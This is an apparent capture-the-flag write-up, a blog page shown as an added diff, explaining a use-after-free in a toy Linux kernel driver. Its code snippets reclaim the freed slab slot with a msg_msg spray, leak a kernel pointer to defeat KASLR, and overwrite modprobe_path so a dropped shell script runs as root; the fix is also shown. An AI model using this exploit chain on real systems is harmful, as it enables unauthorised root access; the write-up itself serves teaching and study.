@@ -1,0 +1,228 @@
+<!doctype html>
+<html lang="en" data-mode="dark" data-crt="on">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<script>(function(){try{var d=document.documentElement,m=localStorage.getItem('sf.mode');if(!m)m=matchMedia('(prefers-color-scheme: light)').matches?'light':'dark';d.setAttribute('data-mode',m);if(localStorage.getItem('sf.crt')==='on')d.setAttribute('data-crt','on');}catch(e){}})();</script>
+<title>a slab use-after-free, from ioctl to root — algoatson.github.io</title>
+<meta name="description" content="A toy char driver frees an object and keeps the pointer. From there it&#x27;s the usual kernel kata — reclaim the slot with a spray, leak KASLR through the dangling read, then turn the dangling write into a modprobe_path overwrite.">
+<meta name="author" content="your name here">
+<link rel="canonical" href="https://algoatson.github.io/p/slab-uaf-modprobe/">
+<meta property="og:type" content="article">
+<meta property="og:title" content="a slab use-after-free, from ioctl to root — algoatson.github.io">
+<meta property="og:description" content="A toy char driver frees an object and keeps the pointer. From there it&#x27;s the usual kernel kata — reclaim the slot with a spray, leak KASLR through the dangling read, then turn the dangling write into a modprobe_path overwrite.">
+<meta property="og:url" content="https://algoatson.github.io/p/slab-uaf-modprobe/">
+<meta property="og:site_name" content="algoatson.github.io">
+<meta property="og:image" content="https://algoatson.github.io/assets/og/slab-uaf-modprobe.png"><meta name="twitter:card" content="summary_large_image">
+<link rel="icon" type="image/svg+xml" href="/assets/favicon.svg">
+<link rel="alternate" type="application/rss+xml" title="algoatson.github.io" href="/feed.xml">
+<link rel="stylesheet" href="/assets/style.css">
+<link rel="stylesheet" href="/assets/pygments.css">
+<script type="application/ld+json">{"@context": "https://schema.org", "@type": "Article", "headline": "a slab use-after-free, from ioctl to root", "datePublished": "2026-02-14", "dateModified": "2026-02-16", "author": {"@type": "Person", "name": "your name here"}, "publisher": {"@type": "Person", "name": "segfault"}, "description": "A toy char driver frees an object and keeps the pointer. From there it's the usual kernel kata — reclaim the slot with a spray, leak KASLR through the dangling read, then turn the dangling write into a modprobe_path overwrite.", "url": "https://algoatson.github.io/p/slab-uaf-modprobe/", "mainEntityOfPage": "https://algoatson.github.io/p/slab-uaf-modprobe/", "keywords": "kernel, pwn, linux"}</script></head>
+<body>
+<a class="skip" href="#main">skip to content</a>
+<div class="progress" aria-hidden="true"></div>
+<div class="wrap">
+  <div class="frame">
+    <span class="frame__legend"><a href="/">algoatson.github.io</a></span>
+    <span class="frame__addr">~/posts</span>
+
+    <header class="bar">
+      <span class="bar__prompt">&#10095; <b>segfault</b>@algoatson.github.io</span>
+      <nav class="nav" aria-label="primary"><a href="/about/">whoami</a><a href="/" aria-current="page">posts</a><a href="/tags/">tags</a></nav>
+      <button class="searchbtn" data-open="search" type="button">grep<kbd>/</kbd></button>
+    </header>
+
+    <main class="main" id="main">
+<a class="backlink" href="/">back to index</a>
+<header class="posthead">
+  <h1>a slab use-after-free, from ioctl to root</h1>
+  <div class="meta"><span>2026-02-14</span><span class="upd">updated 2026-02-16</span><span>4 min read</span><a class="tag" href="/tags/kernel/">kernel</a> <a class="tag" href="/tags/pwn/">pwn</a> <a class="tag" href="/tags/linux/">linux</a></div>
+</header>
+
+<div class="postwrap has-toc">
+  <aside class="toc" aria-label="table of contents"><span class="toctitle">contents</span><div class="toc">
+<ul>
+<li><a href="#the-bug">the bug</a></li>
+<li><a href="#reclaim-and-leak">reclaim and leak</a></li>
+<li><a href="#write-root">write → root</a></li>
+</ul>
+</div>
+</aside>
+  <article class="prose"><blockquote>
+<p><code class="highlight">kctl.ko</code> — "a configurable kernel control device. perfectly safe, we promise."
+You get the module, a stripped <code class="highlight">bzImage</code>, and an unprivileged shell.</p>
+</blockquote>
+<p>The first thing I want from a kernel target is the same checklist as userland,
+just with different acronyms:</p>
+<figure class="target"><figcaption><span class="t-label">target</span><span class="t-file">kctl.ko</span></figcaption><div class="target__grid"><dl class="target__facts"><div><dt>arch</dt><dd>x86_64</dd></div><div><dt>kernel</dt><dd>6.1.0 #1 SMP</dd></div><div><dt>object</dt><dd>kmalloc-1024</dd></div></dl><ul class="target__mits"><li class="m-on"><span class="g" aria-hidden="true">✓</span><span class="mk">SMEP</span><span class="lead" aria-hidden="true"></span><span class="mv">on</span></li><li class="m-on"><span class="g" aria-hidden="true">✓</span><span class="mk">SMAP</span><span class="lead" aria-hidden="true"></span><span class="mv">on</span></li><li class="m-on"><span class="g" aria-hidden="true">✓</span><span class="mk">KASLR</span><span class="lead" aria-hidden="true"></span><span class="mv">on</span></li><li class="m-on"><span class="g" aria-hidden="true">✓</span><span class="mk">KPTI</span><span class="lead" aria-hidden="true"></span><span class="mv">on</span></li></ul></div></figure>
+<p><strong>SMEP/SMAP</strong> mean no jumping to or reading from userland pages in ring 0 — so the
+old <code class="highlight">ret2usr</code> is dead and the payload has to live in kernel memory. <strong>KASLR</strong>
+wants a leak. <strong>KPTI</strong> mostly just complicates the return-to-userland at the end.
+None of it matters if the bug hands me a write where I already know the target.</p>
+<h2 id="the-bug">the bug<a class="headerlink" href="#the-bug" title="Permanent link">#</a></h2>
+<p>The driver multiplexes three ioctls over a single global pointer:</p>
+<figure class="codeblock"><figcaption><span class="fname">kctl.c — ioctl handler</span><span class="lang">c</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#kctlc-ioctl-handler-1"> 1</a></span>
+<span class="normal"><a href="#kctlc-ioctl-handler-2"> 2</a></span>
+<span class="normal"><a href="#kctlc-ioctl-handler-3"> 3</a></span>
+<span class="normal"><a href="#kctlc-ioctl-handler-4"> 4</a></span>
+<span class="normal"><a href="#kctlc-ioctl-handler-5"> 5</a></span>
+<span class="normal"><a href="#kctlc-ioctl-handler-6"> 6</a></span>
+<span class="normal"><a href="#kctlc-ioctl-handler-7"> 7</a></span>
+<span class="normal"><a href="#kctlc-ioctl-handler-8"> 8</a></span>
+<span class="normal"><a href="#kctlc-ioctl-handler-9"> 9</a></span>
+<span class="normal"><a href="#kctlc-ioctl-handler-10">10</a></span>
+<span class="normal"><a href="#kctlc-ioctl-handler-11">11</a></span>
+<span class="normal"><a href="#kctlc-ioctl-handler-12">12</a></span>
+<span class="normal"><a href="#kctlc-ioctl-handler-13">13</a></span>
+<span class="normal"><a href="#kctlc-ioctl-handler-14">14</a></span>
+<span class="normal"><a href="#kctlc-ioctl-handler-15">15</a></span>
+<span class="normal"><a href="#kctlc-ioctl-handler-16">16</a></span>
+<span class="normal"><a href="#kctlc-ioctl-handler-17">17</a></span>
+<span class="normal"><a href="#kctlc-ioctl-handler-18">18</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="kctlc-ioctl-handler-1"><span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">obj</span><span class="p">;</span><span class="w">            </span><span class="c1">// global, kmalloc-1024</span>
+</span><span id="kctlc-ioctl-handler-2">
+</span><span id="kctlc-ioctl-handler-3"><span class="k">static</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="nf">kctl_ioctl</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">file</span><span class="w"> </span><span class="o">*</span><span class="n">f</span><span class="p">,</span><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="n">cmd</span><span class="p">,</span><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">arg</span><span class="p">)</span>
+</span><span id="kctlc-ioctl-handler-4"><span class="p">{</span>
+</span><span id="kctlc-ioctl-handler-5"><span class="w">    </span><span class="k">switch</span><span class="w"> </span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="kctlc-ioctl-handler-6"><span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">KCTL_ALLOC</span><span class="p">:</span>
+</span><span id="kctlc-ioctl-handler-7"><span class="w">        </span><span class="n">obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">kmalloc</span><span class="p">(</span><span class="mi">1024</span><span class="p">,</span><span class="w"> </span><span class="n">GFP_KERNEL</span><span class="p">);</span>
+</span><span id="kctlc-ioctl-handler-8"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">obj</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="o">-</span><span class="n">ENOMEM</span><span class="p">;</span>
+</span><span id="kctlc-ioctl-handler-9"><span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">KCTL_WRITE</span><span class="p">:</span>
+</span><span id="kctlc-ioctl-handler-10"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">copy_from_user</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="n">__user</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">arg</span><span class="p">,</span><span class="w"> </span><span class="mi">1024</span><span class="p">);</span>
+</span><span id="kctlc-ioctl-handler-11"><span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">KCTL_READ</span><span class="p">:</span>
+</span><span id="kctlc-ioctl-handler-12"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">copy_to_user</span><span class="p">((</span><span class="kt">void</span><span class="w"> </span><span class="n">__user</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">arg</span><span class="p">,</span><span class="w"> </span><span class="n">obj</span><span class="p">,</span><span class="w"> </span><span class="mi">1024</span><span class="p">);</span>
+</span><span id="kctlc-ioctl-handler-13"><span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">KCTL_FREE</span><span class="p">:</span>
+</span><span id="kctlc-ioctl-handler-14"><span class="hll"><span class="w">        </span><span class="n">kfree</span><span class="p">(</span><span class="n">obj</span><span class="p">);</span><span class="w">          </span><span class="c1">// ... but obj is never set to NULL</span>
+</span></span><span id="kctlc-ioctl-handler-15"><span class="hll"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w">            </span><span class="c1">// dangling pointer, fully usable</span>
+</span></span><span id="kctlc-ioctl-handler-16"><span class="w">    </span><span class="p">}</span>
+</span><span id="kctlc-ioctl-handler-17"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
+</span><span id="kctlc-ioctl-handler-18"><span class="p">}</span>
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<p><code class="highlight">KCTL_FREE</code> releases the allocation but leaves <code class="highlight">obj</code> pointing at the freed slot.
+<code class="highlight">KCTL_READ</code> and <code class="highlight">KCTL_WRITE</code> still dereference it. That's a use-after-free with
+both a <em>read</em> and a <em>write</em> primitive — the comfortable kind.</p>
+<dl>
+<dt>obj</dt>
+<dd>the freed kmalloc-1024 slot. After <code class="highlight">KCTL_FREE</code> the allocator considers it free;
+the driver still happily reads and writes 1024 bytes through it.</dd>
+</dl>
+<h2 id="reclaim-and-leak">reclaim and leak<a class="headerlink" href="#reclaim-and-leak" title="Permanent link">#</a></h2>
+<p>The plan is textbook: free <code class="highlight">obj</code>, then spray a kernel object of the <em>same</em> size
+class so the allocator hands the freed slot back as something interesting. System
+V messages (<code class="highlight">msg_msg</code>) are the classic kmalloc-1024 filler — attacker-sized,
+attacker-timed, and they carry a kernel pointer in the header.</p>
+<figure class="codeblock"><figcaption><span class="fname">leak.c — reclaim with msg_msg</span><span class="lang">c</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#leakc-reclaim-with-msg-msg-1">1</a></span>
+<span class="normal"><a href="#leakc-reclaim-with-msg-msg-2">2</a></span>
+<span class="normal"><a href="#leakc-reclaim-with-msg-msg-3">3</a></span>
+<span class="normal"><a href="#leakc-reclaim-with-msg-msg-4">4</a></span>
+<span class="normal"><a href="#leakc-reclaim-with-msg-msg-5">5</a></span>
+<span class="normal"><a href="#leakc-reclaim-with-msg-msg-6">6</a></span>
+<span class="normal"><a href="#leakc-reclaim-with-msg-msg-7">7</a></span>
+<span class="normal"><a href="#leakc-reclaim-with-msg-msg-8">8</a></span>
+<span class="normal"><a href="#leakc-reclaim-with-msg-msg-9">9</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="leakc-reclaim-with-msg-msg-1"><span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="n">KCTL_ALLOC</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
+</span><span id="leakc-reclaim-with-msg-msg-2"><span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="n">KCTL_FREE</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span><span class="w">                 </span><span class="c1">// obj now dangling</span>
+</span><span id="leakc-reclaim-with-msg-msg-3">
+</span><span id="leakc-reclaim-with-msg-msg-4"><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">64</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w">             </span><span class="c1">// spray into the hole</span>
+</span><span id="leakc-reclaim-with-msg-msg-5"><span class="w">    </span><span class="n">msgsnd</span><span class="p">(</span><span class="n">qid</span><span class="p">[</span><span class="n">i</span><span class="p">],</span><span class="w"> </span><span class="o">&amp;</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">t</span><span class="p">;</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">b</span><span class="p">[</span><span class="mi">1016</span><span class="p">];</span><span class="w"> </span><span class="p">}){</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="mi">0</span><span class="p">}},</span><span class="w"> </span><span class="mi">1016</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
+</span><span id="leakc-reclaim-with-msg-msg-6">
+</span><span id="leakc-reclaim-with-msg-msg-7"><span class="kt">char</span><span class="w"> </span><span class="n">leak</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
+</span><span id="leakc-reclaim-with-msg-msg-8"><span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="n">KCTL_READ</span><span class="p">,</span><span class="w"> </span><span class="n">leak</span><span class="p">);</span><span class="w">              </span><span class="c1">// read the msg_msg header back</span>
+</span><span id="leakc-reclaim-with-msg-msg-9"><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">kbase</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="o">*</span><span class="p">)(</span><span class="n">leak</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">8</span><span class="p">)</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mh">0x1a3e00</span><span class="p">;</span>
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<p>The <code class="highlight">m_list.next</code> field in the reclaimed header is a pointer into the kernel
+image; subtract its known offset and KASLR is gone. Here's the dump of the
+reclaimed slot, with the leaked pointer called out:</p>
+<figure class="codeblock hexdump"><figcaption><span class="fname">KCTL_READ of the reclaimed slot</span><span class="lang">hex</span><button class="copy" type="button" aria-label="copy hexdump">copy</button></figcaption><div class="hx"><pre><span class="off">00000000</span>  01 00 00 00 00 00 00 00  <mark>00</mark> <mark>3e</mark> <mark>1a</mark> <mark>81</mark> <mark>ff</mark> <mark>ff</mark> <mark>ff</mark> <mark>ff</mark>  <span class="asc">|........<mark>.</mark><mark>&gt;</mark><mark>.</mark><mark>.</mark><mark>.</mark><mark>.</mark><mark>.</mark><mark>.</mark>|</span>
+<span class="off">00000010</span>  00 00 00 00 00 00 00 00  f8 02 00 00 00 00 00 00  <span class="asc">|................|</span></pre></div></figure>
+<p>The freed slot sits at a fixed stride inside its slab page; for a 1024-byte object
+that's <span class="math"><math xmlns="http://www.w3.org/1998/Math/MathML" display="inline"><mrow><mi>&#x0230A;</mi><mn>4096</mn><mo>&#x0002F;</mo><mn>1024</mn><mi>&#x0230B;</mi><mo>&#x0003D;</mo><mn>4</mn></mrow></math></span> objects per page, so the spray only needs
+to win one of four slots to land — hence 64 messages, not two.</p>
+<h2 id="write-root">write → root<a class="headerlink" href="#write-root" title="Permanent link">#</a></h2>
+<p>With KASLR defeated I know where <code class="highlight">modprobe_path</code> lives. It's the laziest kernel
+win there is: a writable global holding the path the kernel <code class="highlight">exec</code>s when it hits
+an unknown binary format. Overwrite it through the dangling <code class="highlight">KCTL_WRITE</code>, trigger
+it with a junk binary, and my script runs as root.</p>
+<div class="admonition warning">
+<p class="admonition-title">SMAP doesn't save them here</p>
+<p>SMAP stops the kernel reading <em>my</em> userland buffer mid-exploit — but every
+byte I need is already in kernel memory (the spray) or written <em>by</em> a
+legitimate <code class="highlight">copy_from_user</code>. The mitigation is on and irrelevant; the bug
+never crosses the boundary it guards.</p>
+</div>
+<figure class="codeblock"><figcaption><span class="fname">root.c — overwrite modprobe_path</span><span class="lang">c</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#rootc-overwrite-modprobe-path-1"> 1</a></span>
+<span class="normal"><a href="#rootc-overwrite-modprobe-path-2"> 2</a></span>
+<span class="normal"><a href="#rootc-overwrite-modprobe-path-3"> 3</a></span>
+<span class="normal"><a href="#rootc-overwrite-modprobe-path-4"> 4</a></span>
+<span class="normal"><a href="#rootc-overwrite-modprobe-path-5"> 5</a></span>
+<span class="normal"><a href="#rootc-overwrite-modprobe-path-6"> 6</a></span>
+<span class="normal"><a href="#rootc-overwrite-modprobe-path-7"> 7</a></span>
+<span class="normal"><a href="#rootc-overwrite-modprobe-path-8"> 8</a></span>
+<span class="normal"><a href="#rootc-overwrite-modprobe-path-9"> 9</a></span>
+<span class="normal"><a href="#rootc-overwrite-modprobe-path-10">10</a></span>
+<span class="normal"><a href="#rootc-overwrite-modprobe-path-11">11</a></span>
+<span class="normal"><a href="#rootc-overwrite-modprobe-path-12">12</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="rootc-overwrite-modprobe-path-1"><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">modprobe</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">kbase</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">MODPROBE_PATH_OFF</span><span class="p">;</span><span class="w">   </span><span class="c1">// resolved from the leak</span>
+</span><span id="rootc-overwrite-modprobe-path-2">
+</span><span id="rootc-overwrite-modprobe-path-3"><span class="c1">// drop the payload + a file with a bogus magic to trigger the modprobe call</span>
+</span><span id="rootc-overwrite-modprobe-path-4"><span class="n">system</span><span class="p">(</span><span class="s">&quot;echo -e &#39;#!/bin/sh</span><span class="se">\\</span><span class="s">ncp /flag /tmp/f; chmod 777 /tmp/f&#39; &gt; /tmp/x; chmod +x /tmp/x&quot;</span><span class="p">);</span>
+</span><span id="rootc-overwrite-modprobe-path-5"><span class="n">system</span><span class="p">(</span><span class="s">&quot;echo -e &#39;</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff&#39; &gt; /tmp/trigger; chmod +x /tmp/trigger&quot;</span><span class="p">);</span>
+</span><span id="rootc-overwrite-modprobe-path-6">
+</span><span id="rootc-overwrite-modprobe-path-7"><span class="c1">// the dangling write still lands in the freed slot; point modprobe_path at /tmp/x</span>
+</span><span id="rootc-overwrite-modprobe-path-8"><span class="kt">char</span><span class="w"> </span><span class="n">buf</span><span class="p">[</span><span class="mi">14</span><span class="p">];</span>
+</span><span id="rootc-overwrite-modprobe-path-9"><span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;/tmp/x&quot;</span><span class="p">);</span>
+</span><span id="rootc-overwrite-modprobe-path-10"><span class="n">arbitrary_write</span><span class="p">(</span><span class="n">modprobe</span><span class="p">,</span><span class="w"> </span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="s">&quot;/tmp/x&quot;</span><span class="p">));</span><span class="w">     </span><span class="c1">// via a second reclaim of obj</span>
+</span><span id="rootc-overwrite-modprobe-path-11">
+</span><span id="rootc-overwrite-modprobe-path-12"><span class="n">system</span><span class="p">(</span><span class="s">&quot;/tmp/trigger&quot;</span><span class="p">);</span><span class="w">                               </span><span class="c1">// unknown binfmt -&gt; runs /tmp/x as root</span>
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<p>The fix is one line — the line the author left out:</p>
+<figure class="codeblock codeblock--diff"><figcaption><span class="fname">the patch</span><span class="lang">diff</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#the-patch-1">1</a></span>
+<span class="normal"><a href="#the-patch-2">2</a></span>
+<span class="normal"><a href="#the-patch-3">3</a></span>
+<span class="normal"><a href="#the-patch-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="the-patch-1"><span class="w"> </span>    case KCTL_FREE:
+</span><span id="the-patch-2"><span class="w"> </span>        kfree(obj);
+</span><span id="the-patch-3"><span class="gi">+        obj = NULL;</span>
+</span><span id="the-patch-4"><span class="w"> </span>        return 0;
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<details class="spoiler">
+<summary>the flag</summary>
+<p><code class="highlight">/tmp/f</code> is the copied, world-readable flag once the trigger fires:
+<code class="highlight">segfault{us3_4ft3r_fr33_st1ll_w0rks_1n_2026}</code>. No ROP, no stack pivot —
+a dangling pointer and one well-known global.</p>
+</details></article>
+</div>
+<section class="related"><span class="related__title">related</span><div class="listing"><a class="row" href="/p/pwntools-cookbook/"><span class="row__date">2026-05-26</span><span class="row__tag">pwn</span><span class="row__title">a pwntools cookbook</span><span class="row__min">4 min</span></a><a class="row" href="/p/checksec-everything/"><span class="row__date">2026-05-19</span><span class="row__tag">tooling</span><span class="row__title">one keybind to checksec everything</span><span class="row__min">3 min</span></a><a class="row" href="/p/finding-gadgets/"><span class="row__date">2026-05-12</span><span class="row__tag">pwn</span><span class="row__title">finding gadgets: ROPgadget, ropper, one_gadget, pwntools</span><span class="row__min">5 min</span></a></div></section>
+<nav class="pager"><a class="prev" href="/p/ecdsa-nonce-reuse/"><span class="lbl">&#8249; newer</span>two signatures, one nonce: recovering an ECDSA key</a><a class="next" href="/p/devirtualizing-a-toy-vm/"><span class="lbl">older &#8250;</span>devirtualizing a toy VM obfuscator</a></nav></main>
+
+    <footer class="status">
+      <span>15 posts</span>
+      <span class="shade">&#9617;&#9618;&#9619;</span>
+      <span>no trackers · no cookies · no js required to read · copying is encouraged</span>
+      <span class="right">
+        <a href="https://github.com/algoatson">github</a><a href="https://twitter.com/yourname">twitter</a><a href="mailto:you@segfault.sh">email</a>
+        <button class="toggle" data-toggle="mode" type="button">[light]</button>
+        <button class="toggle" data-toggle="crt" type="button">[crt]</button>
+        <a href="/feed.xml">[rss]</a>
+      </span>
+    </footer>
+  </div>
+</div>
+
+<div class="palette-mask" role="dialog" aria-modal="true" aria-label="search">
+  <div class="palette">
+    <div class="palette__count">grep<span class="n">0/0</span><span class="rule"></span>posts</div>
+    <div class="palette__input"><span class="sigil">&gt;</span><input type="text"
+       placeholder="fuzzy search title + body…" autocomplete="off" spellcheck="false" aria-label="search query"></div>
+    <div class="palette__results"></div>
+    <div class="palette__hint"><span><kbd>↑↓</kbd>/<kbd>^j ^k</kbd> move</span><span><kbd>⏎</kbd> open</span><span><kbd>esc</kbd> close</span></div>
+  </div>
+</div>
+<div class="help-mask" role="dialog" aria-modal="true" aria-label="keyboard shortcuts">
+  <div class="help"><h3>keys</h3><dl><dt><kbd>/</kbd></dt><dd>search</dd><dt><kbd>j / k</kbd></dt><dd>move / scroll</dd><dt><kbd>enter</kbd></dt><dd>open</dd><dt><kbd>g g / G</kbd></dt><dd>top / bottom</dd><dt><kbd>t</kbd></dt><dd>toggle light</dd><dt><kbd>?</kbd></dt><dd>this help</dd><dt><kbd>esc</kbd></dt><dd>close</dd></dl></div>
+</div>
+<script src="/assets/search-index.js"></script>
+<script src="/assets/app.js" defer></script>
+</body>
+</html>
